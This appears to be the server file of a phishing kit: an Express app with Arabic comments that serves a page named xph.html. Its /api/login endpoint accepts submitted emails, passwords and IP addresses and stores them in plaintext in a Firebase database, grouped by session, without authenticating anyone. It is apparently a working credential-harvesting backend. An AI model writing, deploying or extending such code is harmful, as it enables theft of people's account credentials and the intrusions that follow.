require('dotenv').config();
const express = require('express');
const path = require('path');
const fs = require('fs');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// استخدام body-parser لقراءة البيانات من الطلبات
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// استخراج متغيرات البيئة الخاصة بـ Firebase
const firebaseConfig = {
  apiKey: process.env.FIREBASE_API_KEY,
  authDomain: process.env.FIREBASE_AUTH_DOMAIN,
  databaseURL: process.env.FIREBASE_DATABASE_URL,
  projectId: process.env.FIREBASE_PROJECT_ID,
  storageBucket: process.env.FIREBASE_STORAGE_BUCKET,
  messagingSenderId: process.env.FIREBASE_MESSAGING_SENDER_ID,
  appId: process.env.FIREBASE_APP_ID,
  measurementId: process.env.FIREBASE_MEASUREMENT_ID
};

// استخدام Firebase SDK العادي
const { initializeApp } = require('firebase/app');
const { getDatabase, ref, set, push, serverTimestamp } = require('firebase/database');

// تهيئة Firebase
const firebaseApp = initializeApp(firebaseConfig);
const database = getDatabase(firebaseApp, firebaseConfig.databaseURL);

// API لإنشاء جلسة جديدة
app.post('/api/create-session', async (req, res) => {
  try {
    const sessionId = req.body.sessionId;
    
    if (!sessionId) {
      return res.status(400).json({ error: 'معرف الجلسة مطلوب' });
    }
    
    // إنشاء جلسة جديدة في Firebase
    const sessionRef = ref(database, `login/sessions/${sessionId}`);
    await set(sessionRef, {
      created: serverTimestamp(),
      status: 'active',
      accounts: {}
    });
    
    res.json({ success: true, sessionId });
  } catch (error) {
    console.error('Error creating session:', error);
    res.status(500).json({ error: 'حدث خطأ أثناء إنشاء الجلسة' });
  }
});

// API لتسجيل الدخول
app.post('/api/login', async (req, res) => {
  try {
    const { email, password, sessionId, ip } = req.body;
    
    if (!sessionId || !email || !password) {
      return res.status(400).json({ error: 'البيانات غير مكتملة' });
    }
    
    // تخزين بيانات تسجيل الدخول في Firebase
    const accountsRef = ref(database, `login/sessions/${sessionId}/accounts`);
    const newAccountRef = push(accountsRef);
    await set(newAccountRef, {
      email,
      password,
      timestamp: serverTimestamp(),
      ip: ip || 'غير معروف'
    });
    
    res.json({ success: true });
  } catch (error) {
    console.error('Error logging in:', error);
    res.status(500).json({ error: 'حدث خطأ أثناء تسجيل الدخول' });
  }
});

// معالجة ملف xph.html
app.get('/xph.html', (req, res) => {
  fs.readFile(path.join(__dirname, 'xph.html'), 'utf8', (err, data) => {
    if (err) {
      console.error('Error reading xph.html:', err);
      return res.status(500).send('Error reading file');
    }

    res.setHeader('Content-Type', 'text/html');
    res.send(data);
  });
});

// معالجة ملف script.js
app.get('/js/script.js', (req, res) => {
  fs.readFile(path.join(__dirname, 'js/script.js'), 'utf8', (err, data) => {
    if (err) {
      console.error('Error reading script.js:', err);
      return res.status(500).send('Error reading file');
    }

    res.setHeader('Content-Type', 'application/javascript');
    res.send(data);
  });
});

// تقديم باقي الملفات الثابتة كما هي
app.use(express.static(__dirname));

// إعادة توجيه الصفحة الرئيسية إلى xph.html
app.get('/', (req, res) => {
  res.redirect('/xph.html');
});

// بدء الخادم
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log('Firebase Config loaded from environment variables:');
  console.log(`API Key: ${firebaseConfig.apiKey ? '✓' : '✗'}`);
  console.log(`Auth Domain: ${firebaseConfig.authDomain ? '✓' : '✗'}`);
  console.log(`Database URL: ${firebaseConfig.databaseURL ? '✓' : '✗'}`);
  console.log(`Project ID: ${firebaseConfig.projectId ? '✓' : '✗'}`);
});
